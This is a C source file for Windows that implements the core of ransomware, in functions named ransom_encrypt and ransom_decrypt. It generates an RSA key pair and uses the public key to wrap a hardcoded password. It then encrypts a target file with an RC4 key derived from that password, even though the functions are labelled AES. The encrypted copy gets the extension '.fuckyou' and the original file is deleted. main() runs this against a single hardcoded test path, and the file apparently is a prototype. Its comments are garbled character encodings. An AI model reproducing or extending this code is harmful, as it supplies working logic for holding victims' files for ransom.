#include<Windows.h>
#include<stdio.h>
#include<wincrypt.h>

#define ENCRYPT_BLOCK_SIZE 8
HANDLE hSrc,hDst,hKey;

typedef struct _RSA_CONTEXT
{
	char* ras_public_key;
	char* rsa_private_key;
	char* aes_key;
	BYTE* buf;
	DWORD size;
}RSA_CONTEXT,*PRSA_CONTEXT;

typedef struct _AES_CONTEXT
{
	char* aes_key;
	BYTE* buf;
	DWORD size;
}AES_CONTEXT, *PAES_CONTEXT;

BOOL aes_encrypt(char* filename,char* password)
{
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;
	BYTE* cbuf = NULL;
	DWORD block_len=0;
	DWORD buffer_len=0;
	DWORD r_len=0;
	BOOL ret = FALSE;

	BOOL eof = FALSE;

	if (!CryptAcquireContextW(&hProv,NULL,NULL,PROV_RSA_FULL,0))
	{
		if (!CryptAcquireContextW(&hProv,NULL,NULL,PROV_RSA_FULL,CRYPT_NEWKEYSET))
		{
			goto end;
		}
	}

	if (!CryptCreateHash(hProv,CALG_MD5,0,0,&hHash))
	{
		goto end;
	}
	if (!CryptHashData(hHash, password,strlen(password),0))
	{
		goto end;
	}
	if (!CryptDeriveKey(hProv,CALG_RC4,hHash, CRYPT_NO_SALT,&hKey))
	{
		goto end;
	}

	hSrc = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hSrc==INVALID_HANDLE_VALUE)
	{
		printf("Open file error.\n");
		goto end;
	}
	char *efilepath=NULL;
	efilepath = malloc(MAX_PATH);
	if (efilepath)
	{
		memset(efilepath, 0, MAX_PATH);
		strcpy_s(efilepath, MAX_PATH, filename);
		strcat_s(efilepath, MAX_PATH, ".fuckyou");
	}
	hDst = CreateFileA(efilepath, FILE_WRITE_DATA, FILE_SHARE_READ ,NULL, CREATE_ALWAYS, 0, NULL);
	if (hDst==INVALID_HANDLE_VALUE)
	{
		printf("Open file error.\n");
		goto end;
	}
	
	block_len = 1000 - 1000 % ENCRYPT_BLOCK_SIZE;
	if (ENCRYPT_BLOCK_SIZE>1)
	{
		buffer_len = block_len + ENCRYPT_BLOCK_SIZE;
	}
	else
	{
		buffer_len = block_len;
	}

	cbuf = malloc(buffer_len);
	if (cbuf)
	{
		memset(cbuf, 0, buffer_len);
	}
	do
	{
		if (!ReadFile(hSrc, cbuf, block_len, &r_len, NULL))
		{
			printf("ReadFile error\n");
			break;
		}
		if (r_len<block_len)
		{
			eof = TRUE;
		}
		if (CryptEncrypt(hKey, 0, eof, 0, cbuf, &r_len, buffer_len))
		{
			printf("Enctypt success!\n");
		}
		else
		{
			printf("Encrypt error!\n");
		}
		if (WriteFile(hDst,cbuf,r_len,&r_len,NULL))
		{
			ret = TRUE;
		} 
		else
		{
			printf("WriteFile error\n");
			break;
		}
	} while (!eof);

end:
	if (hSrc)
	{
		CloseHandle(hSrc);
	}
	if (hDst)
	{
		CloseHandle(hDst);
	}
	if (hHash)
	{
		CryptDestroyHash(hHash);
	}
	if (hKey)
	{
		CryptDestroyKey(hKey);
	}
	if (hProv)
	{
		CryptReleaseContext(hProv,0);
	}
	return ret;
}


BOOL aes_decrypt(char* filename, char* password)
{
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;
	BYTE* cbuf = NULL;
	DWORD block_len = 0;
	DWORD buffer_len = 0;
	DWORD r_len = 0;
	BOOL ret = FALSE;
	BOOL eof = FALSE;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_FULL, 0))
	{
		if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_NEWKEYSET))
		{
			goto end;
		}
	}

	if (!CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash))
	{
		goto end;
	}
	if (!CryptHashData(hHash, password, strlen(password), 0))
	{
		goto end;
	}
	if (!CryptDeriveKey(hProv, CALG_RC4, hHash, CRYPT_NO_SALT, &hKey))
	{
		goto end;
	}
	//DWORD aes_key_len = 0;
	//if (!CryptExportKey(hKey,NULL,PLAINTEXTKEYBLOB,0,NULL,&aes_key_len))
	//{
	//	goto end;
	//}
	//BYTE* aes_key = malloc(aes_key_len);
	//if (aes_key)
	//{
	//	memset(aes_key, 0, aes_key_len);
	//	if (CryptExportKey(hKey,NULL,PLAINTEXTKEYBLOB,0,aes_key,&aes_key_len))
	//	{
	//		
	//	}
	//	else
	//	{
	//		goto end;
	//	}
	//}

	hSrc = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hSrc == INVALID_HANDLE_VALUE)
	{
		printf("Open file error.\n");
		goto end;
	}

	char efilename[MAX_PATH] = { 0 };
	strcpy_s(efilename, MAX_PATH, filename);
	for (int i = strlen(efilename); i > 0; i--)
	{
		if (efilename[i] != 0x2e)
		{
			efilename[i] = 0;
		}
		else
		{
			efilename[i] = 0;
			break;
		}
	}
	hDst = CreateFileA(efilename, FILE_WRITE_DATA, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL);
	if (hDst == INVALID_HANDLE_VALUE)
	{
		printf("Open file error.\n");
		goto end;
	}

	block_len = 1000 - 1000 % ENCRYPT_BLOCK_SIZE;
	if (ENCRYPT_BLOCK_SIZE > 1)
	{
		buffer_len = block_len + ENCRYPT_BLOCK_SIZE;
	}
	else
	{
		buffer_len = block_len;
	}

	cbuf = malloc(buffer_len);
	if (cbuf)
	{
		memset(cbuf, 0, buffer_len);
	}
	do
	{
		if (!ReadFile(hSrc, cbuf, block_len, &r_len, NULL))
		{
			printf("ReadFile error\n");
			break;
		}
		if (r_len < block_len)
		{
			eof = TRUE;
		}
		if (CryptDecrypt(hKey, 0, eof, 0, cbuf, &r_len))
		{
			;
		}
		else
		{
			printf("Encrypt error!\n");
		}
		if (!WriteFile(hDst, cbuf, r_len, &r_len, NULL))
		{
			printf("WriteFile error\n");
			break;
		}
	} while (!eof);
	ret = TRUE;

end:
	if (hSrc)
	{
		CloseHandle(hSrc);
	}
	if (hDst)
	{
		CloseHandle(hDst);
	}
	if (hHash)
	{
		CryptDestroyHash(hHash);
	}
	if (hKey)
	{
		CryptDestroyKey(hKey);
	}
	if (hProv)
	{
		CryptReleaseContext(hProv, 0);
	}
	return ret;
}

BOOL open_crypt_context(HCRYPTPROV* provider)
{
	//DWORD dwVersion = GetVersion();
	//DWORD dwMajor = (DWORD)(LOBYTE(LOWORD(dwVersion)));
	LPCTSTR pszProvider = MS_ENH_RSA_AES_PROV;

	//if (dwMajor <= 5)
	//	pszProvider = MS_ENH_RSA_AES_PROV_XP;

	if (!CryptAcquireContext(provider, 0, pszProvider, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		if (!CryptAcquireContext(provider, 0, pszProvider, PROV_RSA_AES, CRYPT_NEWKEYSET)) {
			return FALSE;
		}
	}

	return TRUE;
}


int gen_rsa_keys(char* public_key_file, char* private_key_file)
{
	HCRYPTPROV	hProv;
	HCRYPTKEY hKey;
	DWORD pub_key_len = 0;
	DWORD prv_key_len = 0;
	BYTE* public_key = NULL;
	BYTE* private_key = NULL;
	HANDLE hPub, hPriv;

	hPub = hPriv = NULL;
	if (!open_crypt_context(&hProv))
	{
		goto end;
	}
	if (!CryptGenKey(hProv,AT_KEYEXCHANGE,CRYPT_ARCHIVABLE,&hKey))	//AT_KEYEXCHANGE ÃÜÔ¿½»»»
	{
		printf("CryptGenKey failed\n");
		goto end;
	}
	if (CryptExportKey(hKey,0,PUBLICKEYBLOB,0,NULL,&pub_key_len))
	{
		public_key = malloc(pub_key_len);
		if (public_key)
		{
			memset(public_key, 0, pub_key_len);
			if (!CryptExportKey(hKey, 0, PUBLICKEYBLOB, 0, public_key, &pub_key_len))
			{
				printf("Recv public key failed\n");
				goto end;
			}
		}
		else
		{
			printf("Malloc failed\n");
			goto end;
		}
	}
	else
	{
		printf("CryptExportKey failed\n");
		goto end;
	}

	if (CryptExportKey(hKey, 0, PRIVATEKEYBLOB, 0, NULL, &prv_key_len))
	{
		private_key = malloc(prv_key_len);
		if (private_key)
		{
			memset(private_key, 0, prv_key_len);
			if (!CryptExportKey(hKey, 0, PRIVATEKEYBLOB, 0, private_key, &prv_key_len))
			{
				printf("Recv private key failed\n");
				goto end;
			}
		}
		else
		{
			printf("Malloc failed\n");
			goto end;
		}
	}
	else
	{
		printf("CryptExportKey failed\n");
		goto end;
	}

	DWORD dwLen = 0;
	hPub = CreateFileA(public_key_file, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hPub==INVALID_HANDLE_VALUE)
	{
		printf("Can not create public key file.\n");
		goto end;
	}
	if (!WriteFile(hPub, public_key, pub_key_len, &dwLen, NULL))
	{
		goto end;
	}

	hPriv = CreateFileA(private_key_file, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hPriv==INVALID_HANDLE_VALUE)
	{
		printf("Can not create private key file.\n");
		goto end;
	}
	if (!WriteFile(hPriv,private_key, prv_key_len,&dwLen,NULL))
	{
		goto end;
	}

	printf("Create RSA key success,Save public_key:%s\n", public_key_file);
	printf("                            private_key:%s\n", private_key_file);
end:
	if (private_key)
	{
		free(private_key);
	}
	if (public_key)
	{
		free(public_key);
	}
	if (hPub)
	{
		CloseHandle(hPub);
	}
	if (hPriv)
	{
		CloseHandle(hPriv);
	}
	if (hProv)
	{
		CryptReleaseContext(hProv,0);
	}
	if (hKey)
	{
		CryptDestroyKey(hKey);
	}
	return 0;
}

BOOL rsa_encrypt(PRSA_CONTEXT rsa,BYTE* buf,int buf_len)
{
	HCRYPTPROV hProv;
	HCRYPTKEY hKey;
	HANDLE hPub = NULL;
	BYTE *pub_key = NULL;
	int pub_key_len = 0;
	BYTE* pData = NULL;
	BOOL ret = FALSE;

	if (!open_crypt_context(&hProv))
	{
		goto end;
	}
	hPub = CreateFileA(rsa->ras_public_key, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hPub==INVALID_HANDLE_VALUE)
	{
		printf("Error to open RSA piblic key,Encrypt failed.\n");
		goto end;
	}
	pub_key_len = GetFileSize(hPub,NULL);
	if (pub_key_len==INVALID_FILE_SIZE)
	{
		goto end;
	}
	pub_key = malloc(pub_key_len);
	if (pub_key)
	{
		memset(pub_key, 0, pub_key_len);
	}
	if (!ReadFile(hPub, pub_key, pub_key_len, &pub_key_len, NULL))
	{
		printf("Read public key failed.\n");
		goto end;
	}
	if (!CryptImportKey(hProv,pub_key, pub_key_len,0,0,&hKey))
	{
		printf("CryptImportKey failed.\n");
		goto end;
	}

	//Î´ÅÐ¶Ïbuf³¤¶È
	DWORD dwlen = 0;
	if (!CryptEncrypt(hKey,0,TRUE,0,NULL,&dwlen,0))
	{
		goto end;
	}
	pData = malloc(dwlen);
	if (pData)
	{
		memset(pData, 0, dwlen);
		memcpy_s(pData, dwlen, buf, buf_len);
		if (CryptEncrypt(hKey, 0, TRUE, 0, pData, &buf_len, dwlen))
		{
			ret = TRUE;
			//printf("CryptEncrypt success.\n");
		}
	}


end:
	if (hProv)
	{
		CryptReleaseContext(hProv,0);
	}
	if (hKey)
	{
		CryptDestroyKey(hKey);
	}
	if (pub_key)
	{
		free(pub_key);
	}
	if (hPub)
	{
		CloseHandle(hPub);
	}
	if (pData)
	{
		rsa->buf = pData;
		rsa->size = buf_len;
	}
	return ret;
}

BOOL rsa_decrypt(PRSA_CONTEXT rsa)
{
	HCRYPTPROV hProv;
	HCRYPTKEY hKey;
	HANDLE hPriv = NULL;
	BYTE *priv_key = NULL;
	int priv_key_len = 0;
	DWORD dwlen = 0;
	BOOL ret = FALSE;

	if (!open_crypt_context(&hProv))
	{
		goto end;
	}
	hPriv = CreateFileA(rsa->rsa_private_key, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hPriv==INVALID_HANDLE_VALUE)
	{
		goto end;
	}
	priv_key_len = GetFileSize(hPriv, NULL);
	if (priv_key_len== INVALID_FILE_SIZE)
	{
		goto end;
	}
	priv_key = malloc(priv_key_len);
	if (priv_key)
	{
		memset(priv_key, 0, priv_key_len);
		if (!ReadFile(hPriv,priv_key,priv_key_len,&priv_key_len,NULL))
		{
			goto end;
		}
	}
	if (!CryptImportKey(hProv,priv_key, priv_key_len,0,0,&hKey))
	{
		goto end;
	}

	if (CryptDecrypt(hKey,0,TRUE,0,rsa->buf,&(rsa->size)))
	{
		ret = TRUE;
	}

end:
	if (hProv)
	{
		CryptReleaseContext(hProv, 0);
	}
	if (hKey)
	{
		CryptDestroyKey(hKey);
	}
	if (priv_key)
	{
		free(priv_key);
	}

	return ret;
}

BOOL ransom_encrypt(PRSA_CONTEXT ctx)
{
	char* filename = "D:\\simple\\November\\1128\\tmp\\mon_inst.ini";
	char* aes_pass = "360core";

	BOOL ret = FALSE;

	//Éú³ÉRSAÃÜÔ¿¶Ô
	gen_rsa_keys(ctx->ras_public_key, ctx->rsa_private_key);

	//rsa¹«Ô¿¼ÓÃÜ AESÃÜÂë

	rsa_encrypt(ctx, aes_pass, strlen(aes_pass));

	HANDLE hAes = CreateFileA(ctx->aes_key, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hAes == INVALID_HANDLE_VALUE)
	{
		goto end;
	}
	DWORD dwlen = 0;
	if (!WriteFile(hAes, ctx->buf, ctx->size, &dwlen, NULL))
	{
		goto end;
	}

	if (aes_encrypt(filename, aes_pass) == TRUE)
	{
		if (!DeleteFileA(filename))
		{
			printf("Delete failed:%s\n", filename);
		}
		printf("encrypt file success.");
		ret = TRUE;
	}
	//¼ÓÃÜÂß¼­½áÊø
end:
	if (hAes)
	{
		CloseHandle(hAes);
	}
	if (ctx->buf)
	{
		free(ctx->buf);
	}
	return ret;
}

BOOL ransom_decrypt(PRSA_CONTEXT ctx)
{
	char* efilename = "D:\\simple\\November\\1128\\tmp\\mon_inst.ini.fuckyou";
	BOOL ret = FALSE;
	char* aes_pass = NULL;
	BYTE* aes_key = NULL;
	DWORD dwlen = 0;

	HANDLE hAes = CreateFileA(ctx->aes_key, GENERIC_READ, FILE_SHARE_WRITE, NULL,OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hAes==INVALID_HANDLE_VALUE)
	{
		goto end;
	}
	DWORD aes_key_len = GetFileSize(hAes, 0);
	if (aes_key_len==INVALID_FILE_SIZE)
	{
		goto end;
	}
	aes_key = malloc(aes_key_len);
	if (aes_key)
	{
		memset(aes_key, 0, aes_key_len);
		if (ReadFile(hAes, aes_key,aes_key_len,&dwlen,NULL))
		{
			ctx->buf = aes_key;
			ctx->size = dwlen;
		}
		else
		{
			goto end;
		}
	}
	else
	{
		goto end;
	}
	
	rsa_decrypt(ctx);
	aes_pass = malloc(ctx->size + 1);
	if (aes_pass)
	{
		memset(aes_pass, 0, ctx->size + 1);
		memcpy_s(aes_pass, ctx->size + 1, ctx->buf, ctx->size);
		if (aes_decrypt(efilename, aes_pass))
		{
			ret = TRUE;
		}
	}

end:
	if (hAes)
	{
		CloseHandle(hAes);
	}
	if (aes_pass)
	{
		free(aes_pass);
	}
	if (aes_key)
	{
		free(aes_key);
	}
	return ret;
}

int main()
{
	char* aes_key_file = "D:\\simple\\November\\1128\\tmp\\aes.key";
	char* public_key_file = "D:\\simple\\November\\1128\\tmp\\public.key";
	char* private_key_file = "D:\\simple\\November\\1128\\tmp\\private.key";
	RSA_CONTEXT rsa_ctx = { 0 };
	rsa_ctx.aes_key = aes_key_file;
	rsa_ctx.ras_public_key = public_key_file;
	rsa_ctx.rsa_private_key = private_key_file;
	if (ransom_encrypt(&rsa_ctx))
	{
		printf("ccccc.\n");
	}
	
	if (ransom_decrypt(&rsa_ctx))
	{
		printf("bbbbbbb.\n");
	}
	return 0;
}